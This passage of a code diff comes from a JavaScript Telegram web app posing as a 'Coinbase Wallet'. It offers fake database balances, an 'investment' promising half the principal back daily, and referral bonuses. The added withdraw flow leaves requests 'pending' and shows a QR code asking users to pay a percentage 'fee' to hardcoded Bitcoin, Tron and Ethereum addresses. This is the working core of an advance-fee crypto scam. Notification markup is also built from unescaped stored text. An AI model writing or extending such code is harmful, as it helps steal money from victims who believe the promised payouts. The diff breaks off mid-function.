-            $("#investment-status").html(`Current Investment: $${investmentAmount.toLocaleString()}<br>Daily Reward: $${(investmentAmount / 2).toFixed(2)}`);
+            const currency = userData.settings?.currency || "USD";
+            const reward = (investmentAmount / 2) * (conversionRates.USD[currency] || 1);
+            $("#investment-status").html(`Current Investment: ${investmentAmount.toLocaleString()} ${currency}<br>Daily Reward: ${reward.toFixed(2)} ${currency}`);
             $(".investment-btn").prop("disabled", true);
             updateCountdown(lastClaim);
           } else {
@@ -1232,7 +1658,6 @@
           }
         });
 
-        // Profile form submission
         $("#profile-form").on("submit", async (e) => {
           e.preventDefault();
           const submitButton = $("#submitProfileInfo");
@@ -1271,7 +1696,6 @@
           }
         });
 
-        // Settings form submission
         $("#settings-form").on("submit", async (e) => {
           e.preventDefault();
           const submitButton = $("#submitSettingsInfo");
@@ -1282,10 +1706,13 @@
 
           const theme = $("#themeSelect").val();
           const currency = $("#currencySelect").val();
+          const network = $("#networkSelect").val();
+          const autoRenew = $("#autoRenew").prop('checked');
 
           try {
-            await update(ref(database, `users/${userId}/settings`), { theme, currency });
+            await update(ref(database, `users/${userId}/settings`), { theme, currency, network, autoRenew });
             $("body").removeClass("light dark").addClass(theme);
+            updateNetworkOptions(currency);
             await updateBalanceDisplay();
             iziToast.success({ title: "Success", message: "Settings saved!", position: "topRight" });
             $("#settings-iziModal").iziModal("close");
@@ -1296,113 +1723,114 @@
           }
         });
 
-        // Investment button click
+        let pendingInvestmentAmount = 0;
         $(".investment-btn").on("click", async function() {
-          const amount = parseFloat($(this).data("amount"));
+          pendingInvestmentAmount = parseFloat($(this).data("amount"));
+          const currency = window.firebaseFunctions.userData?.settings?.currency || "USD";
+          $("#confirm-investment-amount").text(`${pendingInvestmentAmount.toFixed(2)} ${currency}`);
+          $("#investment-confirm-modal").iziModal("open");
+        });
+
+        $("#confirm-investment-btn").on("click", async function() {
           const submitButton = $(this);
           submitButton
             .prop("disabled", true)
-            .html('<i class="fas fa-spinner fa-spin-pulse"></i> Processing...');
+            .html('<i class="fas fa-spinner fa-spin-pulse"></i> Confirming...');
 
           try {
-            const snapshot = await get(ref(database, `users/${userId}/balance`));
-            const currentBalance = snapshot.val() || 0;
-            if (amount > currentBalance) {
-              iziToast.error({
-                title: "Error",
-                message: `Insufficient balance! Current: $${currentBalance.toFixed(2)}, Required: $${amount.toFixed(2)}`,
-                position: "topRight"
-              });
-              submitButton.prop("disabled", false).html(`$${amount}`);
+            const snapshot = await get(userRef);
+            if (!snapshot.exists()) {
+              iziToast.error({ title: "Error", message: "User data not found!", position: "topRight" });
+              return;
+            }
+            const userData = snapshot.val() || {};
+            const currentBalance = userData.balance || 0;
+            const currency = userData.settings?.currency || "USD";
+
+            if (pendingInvestmentAmount <= 0 || pendingInvestmentAmount > currentBalance) {
+              iziToast.error({ title: "Error", message: "Invalid investment amount or insufficient balance!", position: "topRight" });
               return;
             }
 
             const updates = {
-              [`users/${userId}/balance`]: currentBalance - amount,
+              [`users/${userId}/balance`]: currentBalance - pendingInvestmentAmount,
               [`users/${userId}/investment`]: {
-                amount: amount,
-                lastClaim: null
+                amount: pendingInvestmentAmount,
+                lastClaim: null,
+                startDate: new Date().toISOString(),
+                lastRenewal: new Date().toISOString(),
               },
               [`users/${userId}/transactions/${push(ref(database, `users/${userId}/transactions`)).key}`]: {
-                amount: amount,
-                wallet: "N/A",
+                amount: pendingInvestmentAmount,
+                currency: currency,
+                wallet: userData.wallet || userWalletAddress,
+                network: userData.settings?.network || "ERC20",
                 type: "Investment",
                 status: "completed",
                 timestamp: new Date().toISOString(),
               },
               [`users/${userId}/notifications/${Date.now()}`]: {
                 title: "Investment Started",
-                message: `You invested $${amount.toFixed(2)}! Claim $${(amount / 2).toFixed(2)} daily.`,
+                message: `You invested ${pendingInvestmentAmount.toFixed(2)} ${currency}!`,
                 timestamp: new Date().toISOString(),
               },
             };
 
             await update(ref(database), updates);
-            iziToast.success({
-              title: "Success",
-              message: `Investment of $${amount.toFixed(2)} started! You can claim $${(amount / 2).toFixed(2)} daily.`,
-              position: "topRight"
-            });
+            iziToast.success({ title: "Success", message: `Investment of ${pendingInvestmentAmount.toFixed(2)} ${currency} started!`, position: "topRight" });
+            $("#investment-confirm-modal").iziModal("close");
           } catch (error) {
             iziToast.error({ title: "Error", message: `Failed to process investment: ${error.message}`, position: "topRight" });
           } finally {
-            submitButton.prop("disabled", false).html(`$${amount}`);
+            submitButton.prop("disabled", false).html("Confirm");
           }
         });
 
-        // Claim reward
-        $("#claim-reward").on("click", async () => {
-          const submitButton = $("#claim-reward");
+        $("#claim-reward").on("click", async function() {
+          const submitButton = $(this);
           submitButton
             .prop("disabled", true)
             .html('<i class="fas fa-spinner fa-spin-pulse"></i> Claiming...');
 
           try {
             const snapshot = await get(userRef);
+            if (!snapshot.exists()) {
+              iziToast.error({ title: "Error", message: "User data not found!", position: "topRight" });
+              return;
+            }
             const userData = snapshot.val() || {};
             const investmentAmount = userData.investment?.amount || 0;
-            if (investmentAmount <= 0) {
-              iziToast.error({ title: "Error", message: "No active investment!", position: "topRight" });
-              submitButton.prop("disabled", false).html("Claim Reward");
-              return;
-            }
-
-            const lastClaim = userData.investment?.lastClaim;
-            const now = new Date().getTime();
-            const oneDay = 24 * 60 * 60 * 1000;
-            const nextClaimTime = lastClaim ? new Date(lastClaim).getTime() + oneDay : 0;
-
-            if (lastClaim && now < nextClaimTime) {
-              iziToast.error({ title: "Error", message: "You can only claim once every 24 hours!", position: "topRight" });
-              submitButton.prop("disabled", true).html("Claim Reward");
-              return;
-            }
-
-            const claimAmount = investmentAmount / 2;
+            const currency = userData.settings?.currency || "USD";
             const currentBalance = userData.balance || 0;
+
+            if (investmentAmount <= 0) {
+              iziToast.error({ title: "Error", message: "No active investment to claim!", position: "topRight" });
+              return;
+            }
+
+            const reward = (investmentAmount / 2) * (conversionRates.USD[currency] || 1);
             const updates = {
-              [`users/${userId}/balance`]: currentBalance + claimAmount,
+              [`users/${userId}/balance`]: currentBalance + reward,
               [`users/${userId}/investment/lastClaim`]: new Date().toISOString(),
               [`users/${userId}/transactions/${push(ref(database, `users/${userId}/transactions`)).key}`]: {
-                amount: claimAmount,
-                wallet: "N/A",
-                type: "Investment Claim",
+                amount: reward,
+                currency: currency,
+                wallet: userData.wallet || userWalletAddress,
+                network: userData.settings?.network || "ERC20",
+                type: "Reward Claim",
                 status: "completed",
                 timestamp: new Date().toISOString(),
               },
               [`users/${userId}/notifications/${Date.now()}`]: {
                 title: "Reward Claimed",
-                message: `You claimed $${claimAmount.toFixed(2)} from your investment!`,
+                message: `You claimed ${reward.toFixed(2)} ${currency}!`,
                 timestamp: new Date().toISOString(),
               },
             };
 
             await update(ref(database), updates);
-            iziToast.success({
-              title: "Success",
-              message: `Claimed $${claimAmount.toFixed(2)}! Next claim available in 24 hours.`,
-              position: "topRight"
-            });
+            iziToast.success({ title: "Success", message: `Claimed ${reward.toFixed(2)} ${currency}!`, position: "topRight" });
+            updateCountdown(new Date().toISOString());
           } catch (error) {
             iziToast.error({ title: "Error", message: `Failed to claim reward: ${error.message}`, position: "topRight" });
           } finally {
@@ -1410,303 +1838,6 @@
           }
         });
 
-        // Notifications
-        onValue(ref(database, `users/${userId}/notifications`), (snapshot) => {
-          const notifications = snapshot.val() || {};
-          const list = $("#notification-table-body");
-          list.empty();
-          if (Object.keys(notifications).length) {
-            Object.values(notifications).forEach(notif => {
-              list.append(`
-                <li>
-                  <strong>${notif.title}</strong><br>
-                  ${notif.message}<br>
-                  <small>${new Date(notif.timestamp).toLocaleString()}</small>
-                </li>
-              `);
-            });
-          } else {
-            list.append(`<li>No new notifications. Check back later!</li>`);
-          }
-        });
-
-        // Transactions
-        onValue(ref(database, `users/${userId}/transactions`), (snapshot) => {
-          const transactions = snapshot.val() || {};
-          const tbody = $("#transaction-table-body");
-          tbody.empty();
-          if (Object.keys(transactions).length) {
-            Object.entries(transactions).forEach(([txId, tx]) => {
-              const displayWallet = window.truncateAddress(tx.wallet);
-              const amountDisplay = tx.type === "Fee" ? `${tx.amount.toFixed(2)} TON` : `$${tx.amount.toFixed(2)}`;
-              tbody.append(`
-                <tr>
-                  <td>${amountDisplay}</td>
-                  <td class="wallet-cell">
-                    ${displayWallet}
-                    ${tx.wallet !== "N/A" ? `<button class="btn-copy" data-wallet="${tx.wallet}" title="Copy full address"><i class="fas fa-copy"></i></button>` : ""}
-                  </td>
-                  <td>${tx.type}</td>
-                  <td>${tx.status}</td>
-                  <td>${new Date(tx.timestamp).toLocaleString()}</td>
-                </tr>
-              `);
-            });
-          } else {
-            tbody.append(`<tr><td colspan="5">No transactions found.</td></tr>`);
-          }
-        });
-
-        // Copy transaction wallet address
-        $(document).on("click", ".btn-copy", async function() {
-          const walletAddress = $(this).data("wallet");
-          try {
-            await copyToClipboard(walletAddress);
-            showToast("Wallet address copied to clipboard!");
-          } catch (error) {
-            iziToast.error({ title: "Error", message: `Failed to copy wallet address: ${error.message}`, position: "topRight" });
-          }
-        });
-
-        // Handle referrals
-        const urlParams = new URLSearchParams(window.location.search);
-        const startParam = urlParams.get("tgWebAppStartParam");
-        const referrerId = startParam ? startParam.replace("ref", "") : null;
-
-        if (referrerId && referrerId !== userId) {
-          try {
-            const snapshot = await get(userRef);
-            if (!snapshot.exists()) {
-              const walletAddress = userId === "54321" ? "UQC1f5pf5qcK5gO1Dju5l5O9Xua_2M8W71Qn-Z0HfkO8aTDy" : generateEthAddress();
-              await set(userRef, {
-                username: username,
-                fullName: "",
-                address: "",
-                balance: 78.01,
-                wallet: walletAddress,
-                referrals: 0,
-                referredBy: referrerId,
-                settings: { theme: "dark", currency: "USD" },
-                investment: { amount: 0, lastClaim: null },
-                notifications: {
-                  welcome: {
-                    title: "Welcome!",
-                    message: "Thanks for joining Coinbase Wallet via referral!",
-                    timestamp: new Date().toISOString(),
-                  },
-                },
-                transactions: {},
-              });
-              const referrerSnapshot = await get(ref(database, `users/${referrerId}`));
-              if (referrerSnapshot.exists()) {
-                const referrerData = referrerSnapshot.val();
-                await update(ref(database, `users/${referrerId}`), {
-                  referrals: (referrerData.referrals || 0) + 1,
-                  balance: (referrerData.balance || 0) + 10,
-                });
-                await push(ref(database, `users/${referrerId}/transactions`), {
-                  amount: 10,
-                  wallet: "N/A",
-                  type: "Referral Bonus",
-                  status: "completed",
-                  timestamp: new Date().toISOString(),
-                });
-              }
-            }
-          } catch (error) {
-            iziToast.error({ title: "Error", message: `Failed to process referral: ${error.message}`, position: "topRight" });
-          }
-        }
-
-        // Update referrals
-        async function updateReferrals(userId) {
-          try {
-            const usersSnapshot = await get(ref(database, `users`));
-            const usersData = usersSnapshot.val() || {};
-            let totalReferred = 0;
-            for (const uid in usersData) {
-              if (usersData[uid]?.referredBy === userId) {
-                totalReferred++;
-              }
-            }
-            await update(userRef, { referrals: totalReferred });
-            return totalReferred;
-          } catch (error) {
-            console.error("Failed to update referrals:", error);
-            iziToast.error({ title: "Error", message: `Failed to update referrals: ${error.message}`, position: "topRight" });
-            return 0;
-          }
-        }
-
-        onValue(ref(database, `users`), (snapshot) => {
-          if (snapshot.exists()) {
-            updateReferrals(userId);
-          }
-        });
-
-        // Withdraw button
-        $(".open-withdraw").on("click", async () => {
-          try {
-            await updateReferrals(userId);
-            const snapshot = await get(userRef);
-            const userData = snapshot.val() || {};
-            const userBalance = userData.balance || 0;
-
-            if (userBalance < 70.01) {
-              const remainingBalance = 70.01 - userBalance;
-              const message = `You need a minimum balance of $70.01 to withdraw. You need $${remainingBalance.toFixed(2)} more in your balance. Current balance: $${userBalance.toFixed(2)}.`;
-              $("#withdraw-message").text(message);
-              $("#darkModal2").iziModal("open");
-              return;
-            }
-
-            const userPaidCookie = document.cookie.split("; ").find(row => row.startsWith("userPaid="));
-            const userPaid = userPaidCookie ? userPaidCookie.split("=")[1] : null;
-
-            if (userPaid === "paid") {
-              $("#darkModal7").iziModal("open");
-            } else {
-              $("#darkModal8").iziModal("open");
-              $("#continuePaymentText").html("Continue »");
-            }
-          } catch (error) {
-            iziToast.error({ title: "Error", message: `Failed to check eligibility: ${error.message}`, position: "topRight" });
-          }
-        });
-
-        // Continue payment
-        $("#continuePayment").on("click", () => {
-          try {
-            document.cookie = `userWithdrawal=pending; expires=${new Date(Date.now() + 86400000).toUTCString()}; path=/`;
-            document.cookie = `userPaid=paid; expires=${new Date(Date.now() + 86400000).toUTCString()}; path=/`;
-            $("#darkModal8").iziModal("close");
-            $("#darkModal9").iziModal("open");
-          } catch (error) {
-            iziToast.error({ title: "Error", message: `Failed to process payment continuation: ${error.message}`, position: "topRight" });
-          }
-        });
-
-        // Close pending modal
-        $("#continuePaymentCls").on("click", () => {
-          try {
-            $("#darkModal9").iziModal("close");
-          } catch (error) {
-            iziToast.error({ title: "Error", message: `Failed to close modal: ${error.message}`, position: "topRight" });
-          }
-        });
-
-        // Withdraw form submission
-        $("#wallet-form").on("submit", async (e) => {
-          e.preventDefault();
-          const submitButton = $("#submitWalletInfo");
-          submitButton
-            .prop("disabled", true)
-            .addClass("loading")
-            .html('<i class="fas fa-spinner fa-spin-pulse"></i> Processing...');
-
-          const recipientWallet = $("#walletInput").val().trim();
-          const amount = parseFloat($("#wallet_amountInput").val().trim());
-          const feeWallet = "UQC1f5pf5qcK5gO1Dju5l5O9Xua_2M8W71Qn-Z0HfkO8aTDy";
-          const feeAmount = 2;
-
-          if (!recipientWallet) {
-            iziToast.error({ title: "Error", message: "Recipient wallet address is required!", position: "topRight" });
-            submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
-            return;
-          }
-          if (isNaN(amount) || amount <= 0) {
-            iziToast.error({ title: "Error", message: "Invalid amount!", position: "topRight" });
-            submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
-            return;
-          }
-          if (recipientWallet.toLowerCase() === userWalletAddress.toLowerCase()) {
-            iziToast.error({ title: "Error", message: "You cannot withdraw funds to your own wallet!", position: "topRight" });
-            submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
-            return;
-          }
-
-          try {
-            const usersSnapshot = await get(ref(database, `users`));
-            const users = usersSnapshot.val() || {};
-            let recipientId = null;
-            for (const uid in users) {
-              if (users[uid].wallet?.toLowerCase() === recipientWallet.toLowerCase()) {
-                recipientId = uid;
-                break;
-              }
-            }
-            if (!recipientId) {
-              iziToast.error({
-                title: "Error",
-                message: `Recipient wallet ${window.truncateAddress(recipientWallet)} not found in the app!`,
-                position: "topRight"
-              });
-              submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
-              return;
-            }
-
-            const snapshot = await get(ref(database, `users/${userId}/balance`));
-            const currentBalance = snapshot.val() || 0;
-            if (amount + feeAmount > currentBalance) {
-              $("#insufficient-balance").removeClass("hide");
-              iziToast.error({
-                title: "Error",
-                message: `Insufficient balance! Current: $${currentBalance.toFixed(2)}, Requested: $${(amount + feeAmount).toFixed(2)} (including 2 TON fee)`,
-                position: "topRight"
-              });
-              submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
-              return;
-            }
-
-            const senderTxRef = push(ref(database, `users/${userId}/transactions`));
-            const recipientTxRef = push(ref(database, `users/${recipientId}/transactions`));
-            const feeTxRef = push(ref(database, `users/${userId}/transactions`));
-            const updates = {
-              [`users/${userId}/balance`]: currentBalance - amount - feeAmount,
-              [`users/${recipientId}/balance`]: (users[recipientId].balance || 0) + amount,
-              [`users/${userId}/transactions/${senderTxRef.key}`]: {
-                amount,
-                wallet: recipientWallet,
-                type: "Withdraw",
-                status: "pending",
-                timestamp: new Date().toISOString(),
-              },
-              [`users/${recipientId}/transactions/${recipientTxRef.key}`]: {
-                amount,
-                wallet: userWalletAddress,
-                type: "Receive",
-                status: "completed",
-                timestamp: new Date().toISOString(),
-              },
-              [`users/${userId}/transactions/${feeTxRef.key}`]: {
-                amount: feeAmount,
-                wallet: feeWallet,
-                type: "Fee",
-                status: "completed",
-                timestamp: new Date().toISOString(),
-              },
-              [`users/${recipientId}/notifications/${Date.now()}`]: {
-                title: "Funds Received",
-                message: `You received $${amount.toFixed(2)} from ${username || "Anonymous"}!`,
-                timestamp: new Date().toISOString(),
-              },
-            };
-
-            await update(ref(database), updates);
-            document.cookie = `userWithdrawal=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
-            document.cookie = `userPaid=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
-            iziToast.success({ title: "Success", message: "Withdrawal request submitted!", position: "topRight" });
-            $("#wallet-form")[0].reset();
-            $("#darkModal7").iziModal("close");
-            $("#darkModal9").iziModal("open");
-          } catch (error) {
-            iziToast.error({ title: "Error", message: `Failed to process withdrawal: ${error.message}`, position: "topRight" });
-          } finally {
-            submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
-          }
-        });
-
-        // Send form submission
         $("#send-form").on("submit", async (e) => {
           e.preventDefault();
           const submitButton = $("#submitSendInfo");
@@ -1715,110 +1846,452 @@
             .addClass("loading")
             .html('<i class="fas fa-spinner fa-spin-pulse"></i> Sending...');
 
-          const recipientWallet = $("#sendWalletInput").val().trim();
-          const amount = parseFloat($("#sendAmountInput").val().trim());
-
-          if (!recipientWallet) {
-            iziToast.error({ title: "Error", message: "Recipient wallet address is required!", position: "topRight" });
-            submitButton.prop("disabled", false).removeClass("loading").val("Send");
-            return;
-          }
-          if (isNaN(amount) || amount <= 0) {
-            iziToast.error({ title: "Error", message: "Invalid amount!", position: "topRight" });
-            submitButton.prop("disabled", false).removeClass("loading").val("Send");
-            return;
-          }
-          if (recipientWallet.toLowerCase() === userWalletAddress.toLowerCase()) {
-            iziToast.error({ title: "Error", message: "You cannot send funds to your own wallet!", position: "topRight" });
-            submitButton.prop("disabled", false).removeClass("loading").val("Send");
-            return;
-          }
+          const wallet = $("#sendWalletInput").val().trim();
+          const amount = parseFloat($("#sendAmountInput").val());
 
           try {
-            const usersSnapshot = await get(ref(database, `users`));
-            const users = usersSnapshot.val() || {};
-            let recipientId = null;
-            for (const uid in users) {
-              if (users[uid].wallet?.toLowerCase() === recipientWallet.toLowerCase()) {
-                recipientId = uid;
-                break;
-              }
+            const snapshot = await get(userRef);
+            if (!snapshot.exists()) {
+              iziToast.error({ title: "Error", message: "User data not found!", position: "topRight" });
+              submitButton.prop("disabled", false).removeClass("loading").val("Send");
+              return;
             }
-            if (!recipientId) {
-              iziToast.error({
-                title: "Error",
-                message: `Recipient wallet ${window.truncateAddress(recipientWallet)} not found in the app!`,
-                position: "topRight"
-              });
+            const userData = snapshot.val() || {};
+            const currentBalance = userData.balance || 0;
+            const currency = userData.settings?.currency || "USD";
+
+            if (!wallet) {
+              iziToast.error({ title: "Error", message: "Wallet address cannot be empty!", position: "topRight" });
               submitButton.prop("disabled", false).removeClass("loading").val("Send");
               return;
             }
 
-            const snapshot = await get(ref(database, `users/${userId}/balance`));
-            const currentBalance = snapshot.val() || 0;
+            if (isNaN(amount) || amount <= 0) {
+              iziToast.error({ title: "Error", message: "Invalid amount!", position: "topRight" });
+              submitButton.prop("disabled", false).removeClass("loading").val("Send");
+              return;
+            }
+
             if (amount > currentBalance) {
               $("#insufficient-send-balance").removeClass("hide");
-              iziToast.error({
-                title: "Error",
-                message: `Insufficient balance! Current: $${currentBalance.toFixed(2)}, Requested: $${amount.toFixed(2)}`,
-                position: "topRight"
-              });
               submitButton.prop("disabled", false).removeClass("loading").val("Send");
               return;
             }
 
-            const senderTxRef = push(ref(database, `users/${userId}/transactions`));
-            const recipientTxRef = push(ref(database, `users/${recipientId}/transactions`));
             const updates = {
               [`users/${userId}/balance`]: currentBalance - amount,
-              [`users/${recipientId}/balance`]: (users[recipientId].balance || 0) + amount,
-              [`users/${userId}/transactions/${senderTxRef.key}`]: {
-                amount,
-                wallet: recipientWallet,
+              [`users/${userId}/transactions/${push(ref(database, `users/${userId}/transactions`)).key}`]: {
+                amount: amount,
+                currency: currency,
+                wallet: wallet,
+                network: userData.settings?.network || "ERC20",
                 type: "Send",
-                status: "completed",
+                status: "pending",
                 timestamp: new Date().toISOString(),
               },
-              [`users/${recipientId}/transactions/${recipientTxRef.key}`]: {
-                amount,
-                wallet: userWalletAddress,
-                type: "Receive",
-                status: "completed",
-                timestamp: new Date().toISOString(),
-              },
-              [`users/${recipientId}/notifications/${Date.now()}`]: {
-                title: "Funds Received",
-                message: `You received $${amount.toFixed(2)} from ${username || "Anonymous"}!`,
+              [`users/${userId}/notifications/${Date.now()}`]: {
+                title: "Send Requested",
+                message: `You sent ${amount.toFixed(2)} ${currency} to ${truncateAddress(wallet)}`,
                 timestamp: new Date().toISOString(),
               },
             };
 
             await update(ref(database), updates);
-            iziToast.success({ title: "Success", message: `Sent $${amount.toFixed(2)} to ${window.truncateAddress(recipientWallet)}!`, position: "topRight" });
+            iziToast.success({ title: "Success", message: `Sent ${amount.toFixed(2)} ${currency}!`, position: "topRight" });
             $("#send-form")[0].reset();
+            $("#insufficient-send-balance").addClass("hide");
             $("#darkModal1").iziModal("close");
           } catch (error) {
-            iziToast.error({ title: "Error", message: `Failed to send funds: ${error.message}`, position: "topRight" });
+            iziToast.error({ title: "Error", message: `Failed to send: ${error.message}`, position: "topRight" });
           } finally {
             submitButton.prop("disabled", false).removeClass("loading").val("Send");
           }
         });
 
-        // Logout
-        $("#logout-btn").on("click", async () => {
+        $("#wallet-form").on("submit", async (e) => {
+          e.preventDefault();
+          const submitButton = $("#submitWalletInfo");
+          submitButton
+            .prop("disabled", true)
+            .addClass("loading")
+            .html('<i class="fas fa-spinner fa-spin-pulse"></i> Withdrawing...');
+
+          const wallet = $("#walletInput").val().trim();
+          const amount = parseFloat($("#wallet_amountInput").val());
+          const network = $("#walletNetwork").val();
+
           try {
-            document.cookie = `userWithdrawal=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
-            document.cookie = `userPaid=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
-            iziToast.success({ title: "Success", message: "Logged out successfully!", position: "topRight" });
-            $("#logout-iziModal").iziModal("close");
-            if (window.Telegram?.WebApp?.close) {
-              window.Telegram.WebApp.close();
-            } else {
-              window.location.href = "about:blank";
+            const snapshot = await get(userRef);
+            if (!snapshot.exists()) {
+              iziToast.error({ title: "Error", message: "User data not found! Please try again.", position: "topRight" });
+              submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
+              return;
             }
+            const userData = snapshot.val() || {};
+            const currentBalance = userData.balance || 0;
+            const currency = userData.settings?.currency || "USD";
+
+            if (!wallet) {
+              iziToast.error({ title: "Error", message: "Wallet address cannot be empty!", position: "topRight" });
+              submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
+              return;
+            }
+
+            if (isNaN(amount) || amount <= 0) {
+              iziToast.error({ title: "Error", message: "Invalid amount!", position: "topRight" });
+              submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
+              return;
+            }
+
+            if (amount > currentBalance) {
+              $("#insufficient-balance").removeClass("hide");
+              iziToast.error({ title: "Error", message: `Insufficient balance: ${currentBalance.toFixed(2)} ${currency} available`, position: "topRight" });
+              submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
+              return;
+            }
+
+            if (amount < 70.01 && currency === "USD") {
+              $("#darkModal7").iziModal("close");
+              $("#darkModal2").iziModal("open");
+              submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
+              return;
+            }
+
+            // Define fee addresses
+            const feeAddresses = {
+              Bitcoin: "1HRaVe6ALzKhKX5i1QsxTTm3jaJMrx2mw4",
+              ERC20: currency === "USDT" ? "TFjxrVXrU3mBLUNeQHnsM4F7SStnQjiR8m" : "0x85e9c9561f1dcdc94d8ee089d914cc5f014a4173",
+            };
+            const feeWallet = feeAddresses[network] || feeAddresses["ERC20"];
+            const feeCurrency = network === "Bitcoin" ? "BTC" : currency;
+
+            // Calculate fee: 4.0816% of amount, converted to feeCurrency
+            const feePercentage = 0.040816; // 4.0816%
+            let feeAmountUSD = amount * feePercentage;
+            if (currency !== "USD") {
+              feeAmountUSD = amount * (1 / conversionRates[currency].USD);
+            }
+            let feeAmount = feeAmountUSD * (conversionRates.USD[feeCurrency] || 1);
+
+            // Apply minimum fees
+            const minFees = {
+              BTC: 0.0001, // ~$6.67 at $66,666/BTC
+              USDT: 0.50,
+              ETH: 0.0002, // ~$0.61 at $3,030/ETH
+            };
+            feeAmount = Math.max(feeAmount, minFees[feeCurrency] || minFees.USDT);
+
+            const updates = {
+              [`users/${userId}/balance`]: currentBalance - amount,
+              [`users/${userId}/transactions/${push(ref(database, `users/${userId}/transactions`)).key}`]: {
+                amount: amount,
+                currency: currency,
+                wallet: wallet,
+                network: network,
+                type: "Withdraw",
+                status: "pending",
+                timestamp: new Date().toISOString(),
+              },
+              [`users/${userId}/notifications/${Date.now()}`]: {
+                title: "Withdrawal Requested",
+                message: `You requested a withdrawal of ${amount.toFixed(2)} ${currency} to ${truncateAddress(wallet)}`,
+                timestamp: new Date().toISOString(),
+              },
+            };
+
+            await update(ref(database), updates);
+            document.cookie = `userWithdrawal=${amount}; path=/`;
+            $("#wallet-form")[0].reset();
+            $("#insufficient-balance").addClass("hide");
+            $("#darkModal7").iziModal("close");
+            $("#darkModal8").iziModal("open");
+
+            // Update fee modal
+            $("#fee-amount").text(feeAmount.toFixed(feeCurrency === "BTC" || feeCurrency === "ETH" ? 6 : 2));
+            $("#fee-currency").text(feeCurrency);
+            $("#fee-wallet").text(feeWallet);
+
+            const qrCodeContainer = document.getElementById("qrCodeContainer");
+            qrCodeContainer.innerHTML = "";
+            new QRCode(qrCodeContainer, {
+              text: feeWallet,
+              width: 128,
+              height: 128,
+              colorDark: "#000000",
+              colorLight: "#ffffff",
+              correctLevel: QRCode.CorrectLevel.H,
+            });
+          } catch (error) {
+            iziToast.error({ title: "Error", message: `Failed to withdraw: ${error.message}`, position: "topRight" });
+          } finally {
+            submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
+          }
+        });
+
+        $("#continuePayment").on("click", async () => {
+          const cookies = document.cookie.split(";").reduce((acc, cookie) => {
+            const [name, value] = cookie.trim().split("=");
+            acc[name] = value;
+            return acc;
+          }, {});
+
+          if (!cookies.userWithdrawal) {
+            iziToast.error({ title: "Error", message: "No withdrawal request found!", position: "topRight" });
+            return;
+          }
+
+          try {
+            const snapshot = await get(userRef);
+            if (!snapshot.exists()) {
+              iziToast.error({ title: "Error", message: "User data not found!", position: "topRight" });
+              return;
+            }
+            const userData = snapshot.val() || {};
+            const network = userData.settings?.network || "ERC20";
+            const currency = userData.settings?.currency || "USD";
+            const feeAddresses = {
+              Bitcoin: "1HRaVe6ALzKhKX5i1QsxTTm3jaJMrx2mw4",
+              ERC20: currency === "USDT" ? "TFjxrVXrU3mBLUNeQHnsM4F7SStnQjiR8m" : "0x85e9c9561f1dcdc94d8ee089d914cc5f014a4173",
+            };
+            const feeWallet = feeAddresses[network] || feeAddresses["ERC20"];
+            const feeCurrency = network === "Bitcoin" ? "BTC" : currency;
+
+            // Calculate fee for the withdrawal amount
+            const withdrawalAmount = parseFloat(cookies.userWithdrawal);
+            let feeAmountUSD = withdrawalAmount * 0.040816;
+            if (currency !== "USD") {
+              feeAmountUSD = withdrawalAmount * (1 / conversionRates[currency].USD);
+            }
+            let feeAmount = feeAmountUSD * (conversionRates.USD[feeCurrency] || 1);
+            const minFees = {
+              BTC: 0.0001,
+              USDT: 0.50,
+              ETH: 0.0002,
+            };
+            feeAmount = Math.max(feeAmount, minFees[feeCurrency] || minFees.USDT);
+
+            await update(ref(database, `users/${userId}/transactions/${push(ref(database, `users/${userId}/transactions`)).key}`), {
+              amount: feeAmount,
+              currency: feeCurrency,
+              wallet: feeWallet,
+              network: network,
+              type: "Fee Payment",
+              status: "pending",
+              timestamp: new Date().toISOString(),
+            });
+            document.cookie = `userPaid=true; path=/`;
+            $("#darkModal8").iziModal("close");
+            $("#darkModal9").iziModal("open");
+          } catch (error) {
+            iziToast.error({ title: "Error", message: `Failed to process payment: ${error.message}`, position: "topRight" });
+          }
+        });
+
+        $("#continuePaymentCls").on("click", () => {
+          $("#darkModal9").iziModal("close");
+          document.cookie = `userWithdrawal=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
+          document.cookie = `userPaid=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
+        });
+
+        $("#logout-btn").on("click", () => {
+          try {
+            window.Telegram.WebApp.close();
           } catch (error) {
             iziToast.error({ title: "Error", message: `Failed to logout: ${error.message}`, position: "topRight" });
           }
+        });
+
+        onValue(ref(database, `users/${userId}/notifications`), (snapshot) => {
+          const notifications = snapshot.val() || {};
+          const notificationList = $("#notification-table-body");
+          notificationList.empty();
+
+          // Sort notifications by timestamp (descending)
+          const sortedNotifications = Object.entries(notifications).sort(([, a], [, b]) => {
+            return new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime();
+          });
+
+          sortedNotifications.forEach(([id, notif]) => {
+            notificationList.append(`
+              <li>
+                <strong>${notif.title}</strong>: ${notif.message}<br>
+                <small>${new Date(notif.timestamp).toLocaleString()}</small>
+              </li>
+            `);
+          });
+        });
+
+        onValue(ref(database, `users/${userId}/transactions`), (snapshot) => {
+          const transactions = snapshot.val() || {};
+          const transactionTable = $("#transaction-table-body");
+          transactionTable.empty();
+
+          // Sort transactions by timestamp (descending)
+          const sortedTransactions = Object.entries(transactions).sort(([, a], [, b]) => {
+            return new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime();
+          });
+
+          sortedTransactions.forEach(([id, tx]) => {
+            const currency = tx.currency && ["USD", "USDT", "BTC", "ETH"].includes(tx.currency) ? tx.currency : "USD";
+            const amount = currency === "BTC" || currency === "ETH" ? tx.amount.toFixed(6) : tx.amount.toFixed(2);
